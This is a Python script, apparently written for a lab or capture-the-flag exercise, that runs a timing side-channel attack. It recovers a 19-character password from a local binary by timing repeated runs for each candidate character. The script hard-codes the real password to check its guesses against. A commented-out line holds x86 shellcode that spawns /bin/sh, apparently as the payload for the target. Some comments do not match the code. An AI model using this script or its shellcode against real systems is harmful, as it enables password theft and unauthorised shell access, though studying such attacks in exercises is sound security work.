#!/usr/bin/python3
# -*- coding: utf-8 -*-
import os
import string
import time

rpasswd = 'S1deCh4nnelAttack3r'  # 正确的密码
# shellcode = '\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80'
shellcode = '123'
password = []    # 定义密码变量
numletter = string.ascii_letters+string.digits  # 密码范围
print(numletter)
for k in range(19):   # 限定密码长度
    time.sleep(1)  # 必要的
    timelist = []
    for c in numletter:  # 遍历密码范围
        password.append(c)
        avgtime = 0      # 定义并将统计时间变量置为0
        command = './sidechannel ' + \
            ''.join(password)+' '+shellcode   # 拼接要运行的命令
        for i in range(50):  # 重复25次
            start = time.time()  # 使用time_ns函数计时
            os.system(command)  # 运行命令
            end = time.time()
            avgtime += end - start  # 记录平均时间
        timelist.append(avgtime)  # 添加至列表，之后比较
        password.pop()
        # print(timelist)

    if len(password) == 18:  # 当最后个时，时间最长为正确
        password.append(numletter[timelist.index(max(timelist))])
        print(''.join(password))
    else:  # 将时间最短的保留
        password.append(numletter[timelist.index(min(timelist))])

    if password[k] != rpasswd[k]:  # 判断密码是否正确，不正确打印相关信息
        print("Error "+str(password[k]) + ':'+str(timelist[numletter.index(password[k])]) +
              "，Success is "+str(rpasswd[k])+':'+str(timelist[numletter.index(rpasswd[k])]))

    print(''.join(password))  # 打印已经判断出的密码
